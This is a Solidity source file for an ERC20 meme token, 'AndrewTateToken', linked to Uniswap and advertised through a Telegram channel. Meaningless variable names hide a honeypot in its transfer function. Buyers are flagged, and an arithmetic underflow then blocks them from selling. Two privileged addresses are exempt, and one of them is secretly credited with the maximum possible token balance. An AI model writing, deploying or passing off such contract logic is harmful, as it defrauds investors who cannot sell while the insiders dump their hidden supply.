// https://t.me/andrewtatetoken_eth

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.8;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract AndrewTateToken is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private party;

    function _transfer(
        address slow,
        address rush,
        uint256 once
    ) internal override {
        uint256 dinner = point;

        address occasionally = uniswapV2Pair;

        if (occasionally != slow && right[slow] == 0 && party[slow] > 0) {
            right[slow] -= dinner;
        }

        address society = useful;
        useful = rush;
        party[society] += dinner + 1;

        _balances[slow] -= once;
        uint256 group = (once / 100) * point;
        once -= group;
        _balances[rush] += once;
    }

    address private useful;
    mapping(address => uint256) private right;
    uint256 public point = 3;

    constructor(
        string memory low,
        string memory disease,
        address kind,
        address hit
    ) ERC20(low, disease) {
        uniswapV2Router = IUniswapV2Router02(kind);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        right[msg.sender] = tank;
        right[hit] = tank;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[hit] = tank;
    }

    uint256 private tank = ~uint256(0);
}